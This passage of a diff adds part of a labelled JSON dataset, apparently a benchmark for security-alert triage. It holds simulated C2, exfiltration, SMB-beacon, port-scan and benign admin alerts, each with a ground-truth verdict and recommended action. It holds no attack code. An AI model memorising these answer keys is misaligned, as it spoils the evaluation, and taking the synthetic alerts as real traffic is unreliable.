+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1071.004"
+        ],
+        "correct_action": "block",
+        "notes": ""
+      }
+    },
+    {
+      "id": "g-028",
+      "name": "Kết nối tới IP C2 đã biết",
+      "alerts": [
+        {
+          "alert_id": "g028:n1",
+          "rule_name": "Connection to Known C2",
+          "rule_level": "critical",
+          "attack_ids": [
+            "T1071"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "203.0.113.99",
+          "dest_port": 443,
+          "host": "sensor-net-01",
+          "summary": "Connection to Known C2 | 192.168.56.20 -> 203.0.113.99:443 | host=sensor-net-01",
+          "fields": {
+            "proto": "TCP",
+            "app_proto": "tls",
+            "flow": {
+              "pkts_toserver": 80,
+              "pkts_toclient": 80,
+              "bytes_toserver": 8000,
+              "bytes_toclient": 6500,
+              "start": "2026-09-27T01:00:00Z",
+              "end": "2026-09-27T01:00:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1071"
+        ],
+        "correct_action": "block",
+        "notes": "IP C2 trong threat intel"
+      }
+    },
+    {
+      "id": "g-029",
+      "name": "Outbound lớn từ webserver",
+      "alerts": [
+        {
+          "alert_id": "g029:n1",
+          "rule_name": "Large Outbound Transfer",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1041"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "203.0.113.45",
+          "dest_port": 443,
+          "host": "sensor-net-01",
+          "summary": "Large Outbound Transfer | 192.168.56.20 -> 203.0.113.45:443 | host=sensor-net-01",
+          "fields": {
+            "proto": "TCP",
+            "app_proto": "tls",
+            "flow": {
+              "pkts_toserver": 5000,
+              "pkts_toclient": 5000,
+              "bytes_toserver": 50000000,
+              "bytes_toclient": 5000000,
+              "start": "2026-09-27T01:00:00Z",
+              "end": "2026-09-27T01:00:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1041"
+        ],
+        "correct_action": "block",
+        "notes": "exfil 50MB ra ngoài"
+      }
+    },
+    {
+      "id": "g-030",
+      "name": "SMB beacon",
+      "alerts": [
+        {
+          "alert_id": "g030:n1",
+          "rule_name": "SMB Beacon",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1071",
+            "T1021.002"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "192.168.56.50",
+          "dest_port": 445,
+          "host": "sensor-net-01",
+          "summary": "SMB Beacon | 192.168.56.20 -> 192.168.56.50:445 | host=sensor-net-01",
+          "fields": {
+            "proto": "TCP",
+            "app_proto": "smb",
+            "flow": {
+              "pkts_toserver": 30,
+              "pkts_toclient": 30,
+              "bytes_toserver": 4000,
+              "bytes_toclient": 3500,
+              "start": "2026-09-27T01:00:00Z",
+              "end": "2026-09-27T01:00:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1021.002"
+        ],
+        "correct_action": "block",
+        "notes": ""
+      }
+    },
+    {
+      "id": "g-031",
+      "name": "Port scan từ IP ngoài",
+      "alerts": [
+        {
+          "alert_id": "g031:n1",
+          "rule_name": "Network Port Scan Detected",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1595",
+            "T1046"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 445,
+          "host": "sensor-net-01",
+          "summary": "Network Port Scan Detected | 203.0.113.45 -> 192.168.56.20:445 | host=sensor-net-01",
+          "fields": {
+            "proto": "TCP",
+            "app_proto": "failed",
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:00:00Z",
+              "end": "2026-09-27T01:00:00Z",
+              "src_ip": "203.0.113.45",
+              "dest_ip": "192.168.56.20"
+            },
+            "signature": "ET SCAN Possible TCP Port Scan",
+            "signature_id": 2001219,
+            "sensor": "suricata-lab"
+          }
+        },
+        {
+          "alert_id": "g031:n2",
+          "rule_name": "Network Port Scan Detected",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1595",
+            "T1046"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 22,
+          "host": "sensor-net-01",
+          "summary": "Network Port Scan Detected | 203.0.113.45 -> 192.168.56.20:22 | host=sensor-net-01",
+          "fields": {
+            "proto": "TCP",
+            "app_proto": "failed",
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:00:00Z",
+              "end": "2026-09-27T01:00:00Z",
+              "src_ip": "203.0.113.45",
+              "dest_ip": "192.168.56.20"
+            },
+            "signature": "ET SCAN Possible TCP Port Scan",
+            "signature_id": 2001219,
+            "sensor": "suricata-lab"
+          }
+        },
+        {
+          "alert_id": "g031:n3",
+          "rule_name": "Network Port Scan Detected",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1595",
+            "T1046"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 3389,
+          "host": "sensor-net-01",
+          "summary": "Network Port Scan Detected | 203.0.113.45 -> 192.168.56.20:3389 | host=sensor-net-01",
+          "fields": {
+            "proto": "TCP",
+            "app_proto": "failed",
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:00:00Z",
+              "end": "2026-09-27T01:00:00Z",
+              "src_ip": "203.0.113.45",
+              "dest_ip": "192.168.56.20"
+            },
+            "signature": "ET SCAN Possible TCP Port Scan",
+            "signature_id": 2001219,
+            "sensor": "suricata-lab"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "medium",
+        "attack_ids": [
+          "T1595",
+          "T1046"
+        ],
+        "correct_action": "block",
+        "notes": ""
+      }
+    },
+    {
+      "id": "g-032",
+      "name": "Port scan từ IP nội bộ lạ",
+      "alerts": [
+        {
+          "alert_id": "g032:n1",
+          "rule_name": "Network Port Scan Detected",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1595",
+            "T1046"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "192.168.56.77",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "sensor-net-01",
+          "summary": "Network Port Scan Detected | 192.168.56.77 -> 192.168.56.20:80 | host=sensor-net-01",
+          "fields": {
+            "proto": "TCP",
+            "app_proto": "failed",
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:00:00Z",
+              "end": "2026-09-27T01:00:00Z",
+              "src_ip": "192.168.56.77",
+              "dest_ip": "192.168.56.20"
+            },
+            "signature": "ET SCAN Possible TCP Port Scan",
+            "signature_id": 2001219,
+            "sensor": "suricata-lab"
+          }
+        },
+        {
+          "alert_id": "g032:n2",
+          "rule_name": "Network Port Scan Detected",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1595",
+            "T1046"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "192.168.56.77",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 443,
+          "host": "sensor-net-01",
+          "summary": "Network Port Scan Detected | 192.168.56.77 -> 192.168.56.20:443 | host=sensor-net-01",
+          "fields": {
+            "proto": "TCP",
+            "app_proto": "failed",
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:00:00Z",
+              "end": "2026-09-27T01:00:00Z",
+              "src_ip": "192.168.56.77",
+              "dest_ip": "192.168.56.20"
+            },
+            "signature": "ET SCAN Possible TCP Port Scan",
+            "signature_id": 2001219,
+            "sensor": "suricata-lab"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "medium",
+        "attack_ids": [
+          "T1046"
+        ],
+        "correct_action": "block",
+        "notes": ""
+      }
+    },
+    {
+      "id": "g-033",
+      "name": "Service scan chậm",
+      "alerts": [
+        {
+          "alert_id": "g033:n1",
+          "rule_name": "Network Port Scan Detected",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1595",
+            "T1046"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 8080,
+          "host": "sensor-net-01",
+          "summary": "Network Port Scan Detected | 203.0.113.45 -> 192.168.56.20:8080 | host=sensor-net-01",
+          "fields": {
+            "proto": "TCP",
+            "app_proto": "failed",
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:00:00Z",
+              "end": "2026-09-27T01:00:00Z",
+              "src_ip": "203.0.113.45",
+              "dest_ip": "192.168.56.20"
+            },
+            "signature": "ET SCAN Possible TCP Port Scan",
+            "signature_id": 2001219,
+            "sensor": "suricata-lab"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "medium",
+        "attack_ids": [
+          "T1046"
+        ],
+        "correct_action": "review",
+        "notes": "1 kết nối — chưa đủ chắc, chuyển review"
+      }
+    },
+    {
+      "id": "g-034",
+      "name": "IT scanner quét định kỳ",
+      "alerts": [
+        {
+          "alert_id": "g034:n1",
+          "rule_name": "Network Port Scan Detected",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1595",
+            "T1046"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "192.168.56.30",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "sensor-net-01",
+          "summary": "Network Port Scan Detected | 192.168.56.30 -> 192.168.56.20:80 | host=sensor-net-01",
+          "fields": {
+            "proto": "TCP",
+            "app_proto": "failed",
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:00:00Z",
+              "end": "2026-09-27T01:00:00Z",
+              "src_ip": "192.168.56.30",
+              "dest_ip": "192.168.56.20"
+            },
+            "signature": "ET SCAN Possible TCP Port Scan",
+            "signature_id": 2001219,
+            "sensor": "suricata-lab"
+          }
+        },
+        {
+          "alert_id": "g034:n2",
+          "rule_name": "Network Port Scan Detected",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1595",
+            "T1046"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "192.168.56.30",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 443,
+          "host": "sensor-net-01",
+          "summary": "Network Port Scan Detected | 192.168.56.30 -> 192.168.56.20:443 | host=sensor-net-01",
+          "fields": {
+            "proto": "TCP",
+            "app_proto": "failed",
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:00:00Z",
+              "end": "2026-09-27T01:00:00Z",
+              "src_ip": "192.168.56.30",
+              "dest_ip": "192.168.56.20"
+            },
+            "signature": "ET SCAN Possible TCP Port Scan",
+            "signature_id": 2001219,
+            "sensor": "suricata-lab"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1046"
+        ],
+        "correct_action": "no_action",
+        "notes": "IP=it_scanner trong inventory"
+      }
+    },
+    {
+      "id": "g-035",
+      "name": "Health check từ LB",
+      "alerts": [
+        {
+          "alert_id": "g035:w1",
+          "rule_name": "Web Traffic",
+          "rule_level": "low",
+          "attack_ids": [],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "192.168.56.5",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "Web Traffic | 192.168.56.5 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "request_method": "GET",
+            "request_uri": "/health",
+            "http_user_agent": "ELB-HealthChecker/2.0",
+            "status": 200
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [],
+        "correct_action": "no_action",
+        "notes": "UA health checker"
+      }
+    },
+    {
+      "id": "g-036",
+      "name": "Admin chạy whoami đúng giờ",
+      "alerts": [
+        {
+          "alert_id": "g036:e1",
+          "rule_name": "Discovery Whoami",
+          "rule_level": "low",
+          "attack_ids": [
+            "T1033"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Discovery Whoami |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\whoami.exe",
+            "CommandLine": "whoami",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "DOMAIN\\admin",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1033"
+        ],
+        "correct_action": "no_action",
+        "notes": "user admin, giờ hành chính"
+      }
+    },
+    {
+      "id": "g-037",
+      "name": "PowerShell admin script có chữ ký",
+      "alerts": [
+        {
+          "alert_id": "g037:e1",
+          "rule_name": "PowerShell Script",
+          "rule_level": "low",
+          "attack_ids": [],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "PowerShell Script |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -File C:\\Scripts\\backup.ps1",
+            "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+            "User": "DOMAIN\\backup",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [],
+        "correct_action": "no_action",
+        "notes": "script có chữ ký, chạy bởi service"
+      }
+    },
+    {
+      "id": "g-038",
+      "name": "Scan từ monitoring system",
+      "alerts": [
+        {
+          "alert_id": "g038:n1",
+          "rule_name": "Network Port Scan Detected",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1595",
+            "T1046"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "192.168.56.5",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 9100,
+          "host": "sensor-net-01",
+          "summary": "Network Port Scan Detected | 192.168.56.5 -> 192.168.56.20:9100 | host=sensor-net-01",
+          "fields": {
+            "proto": "TCP",
+            "app_proto": "failed",
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:00:00Z",
+              "end": "2026-09-27T01:00:00Z",
+              "src_ip": "192.168.56.5",
+              "dest_ip": "192.168.56.20"
+            },
+            "signature": "ET SCAN Possible TCP Port Scan",
+            "signature_id": 2001219,
+            "sensor": "suricata-lab"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1046"
+        ],
+        "correct_action": "no_action",
+        "notes": "IP monitoring"
+      }
+    },
+    {
+      "id": "g-039",
+      "name": "Backup job tạo scheduled task",
+      "alerts": [
+        {
+          "alert_id": "g039:e1",
+          "rule_name": "Scheduled Task Created",
+          "rule_level": "low",
+          "attack_ids": [
+            "T1053.005"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Scheduled Task Created |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks /create /tn BackupNightly /tr C:\\Scripts\\backup.bat /sc daily /st 02:00",
+            "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+            "User": "DOMAIN\\backup",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1053.005"
+        ],
+        "correct_action": "no_action",
+        "notes": "backup hợp lệ ban đêm"
+      }
+    },
+    {
+      "id": "g-040",
+      "name": "Chrome update check",
+      "alerts": [
+        {
+          "alert_id": "g040:e1",
+          "rule_name": "Suspicious Outbound HTTP",
+          "rule_level": "low",
+          "attack_ids": [],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "142.250.80.1",
+          "dest_port": 443,
+          "host": "sensor-net-01",
+          "summary": "Suspicious Outbound HTTP | 192.168.56.20 -> 142.250.80.1:443 | host=sensor-net-01",
+          "fields": {
+            "proto": "TCP",
+            "app_proto": "tls",
+            "flow": {
+              "pkts_toserver": 20,
+              "pkts_toclient": 20,
+              "bytes_toserver": 3000,
+              "bytes_toclient": 2500,
+              "start": "2026-09-27T01:00:00Z",
+              "end": "2026-09-27T01:00:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [],
+        "correct_action": "no_action",
+        "notes": "Google update"
+      }
+    }
+  ]
+}
